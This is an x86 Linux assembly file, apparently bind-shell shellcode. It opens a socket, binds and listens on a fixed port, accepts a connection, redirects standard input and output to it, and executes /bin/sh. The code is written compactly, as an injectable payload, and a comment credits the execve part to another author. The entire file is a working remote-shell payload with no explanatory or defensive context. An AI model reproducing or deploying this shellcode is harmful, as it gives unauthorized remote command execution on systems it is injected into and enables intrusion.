	.globl	cbegin
	.globl	cend

cbegin:

/* socket */
	xorl	%eax,		%eax
	cdq
	push	%eax
	incb	%al
	movl	%eax,		%ebx
	push	%eax
	incb	%al
	push	%eax
	movl	%esp,		%ecx
	movb	$0x66,		%al
	int	$0x80

/* bind */
	push	%edx
	pushw	$0x7350
	pushw	%dx
	movl	%esp,		%edx

	push	$0x10
	push	%edx
	push	%eax
	movl	%esp,		%ecx

	incb	%bl
	movl	%eax,		%edx
	movb	$0x66,		%al
	int	$0x80

/* listen */
	addb	$0x02,		%bl
	movb	$0x66,		%al
	int	$0x80

/* accept */
	push	%eax
	push	%edx
	movl	%esp,		%ecx

	incb	%bl
	movb	$0x66,		%al
	int	$0x80

/* dup2 fd 0 + fd 1 */
	movl	%eax,		%ebx
	xorl	%ecx,		%ecx

	movb	$0x3f,		%al
	int	$0x80

	incb	%cl
	movb	$0x3f,		%al
	int	$0x80

/* execve shell (by lorian, see execve.s) - slightly modified */
	movb	$0x0b,		%al
	cdq
	pushl     %edx
	push      $0x68732F6E
	push      $0x69622F2F
	movl      %esp, %ebx
	pushl     %edx
	pushl     %ebx
	movl      %esp, %ecx
	int	  $0x80

cend:

